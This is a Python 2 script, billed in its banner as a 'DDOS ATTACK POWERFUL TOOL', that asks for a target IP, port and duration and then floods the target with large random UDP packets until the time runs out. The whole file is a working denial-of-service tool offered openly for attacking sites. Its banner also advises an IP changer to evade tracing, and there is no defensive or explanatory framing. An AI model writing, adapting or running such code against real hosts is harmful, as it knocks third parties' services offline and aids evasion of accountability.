import os

import sys

import time

import socket

import random



os.system("clear")



#Credit : Oo Sahand Oo (Code Boy)

#Dont Change Banner Title

#Dont Edit File Code



sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(9999)



os.system("clear")

print("""



   _____          _      ____                _____  _____   ____   _____         _______ _______       _____ _  __

  / ____|        | |    |  _ \              |  __ \|  __ \ / __ \ / ____|     /\|__   __|__   __|/\   / ____| |/ /

 | |     ___   __| | ___| |_) | ___  _   _  | |  | | |  | | |  | | (___      /  \  | |     | |  /  \ | |    | ' / 

 | |    / _ \ / _` |/ _ \  _ < / _ \| | | | | |  | | |  | | |  | |\___ \    / /\ \ | |     | | / /\ \| |    |  <  

 | |___| (_) | (_| |  __/ |_) | (_) | |_| | | |__| | |__| | |__| |____) |  / ____ \| |     | |/ ____ \ |____| . \ 

  \_____\___/ \__,_|\___|____/ \___/ \__, | |_____/|_____/ \____/|_____/  /_/    \_\_|     |_/_/    \_\_____|_|\_\

                                      __/ |                                                                       

                                     |___/                                                                        



                                                                                                                                                                                                              

DDOS ATTACK POWERFUL TOOL BY : Oo Sahand Oo (Code Boy) / You can use it to attack sites and channels & Use RedHat Auto IP Changer For Best Result



	""")



#Credit : Oo Sahand Oo

ip = raw_input("Target IP >>> : ")



#Credit : Oo Sahand Oo

port = input("PORT >>> : ")



#Credit : Oo Sahand Oo

dur = input("Time >>> : ")



#Credit : Oo Sahand Oo

timeout = time.time() + dur



sent = 0



while True:

	try:

		if time.time() > timeout:

			break

		else:

			pass

		sock.sendto(bytes,(ip, port))

		sent = sent + 100

		print "Sent %s packets to %s through port %s"%(sent, ip, port)

	except KeyboardInterrupt:

		sys.exit()









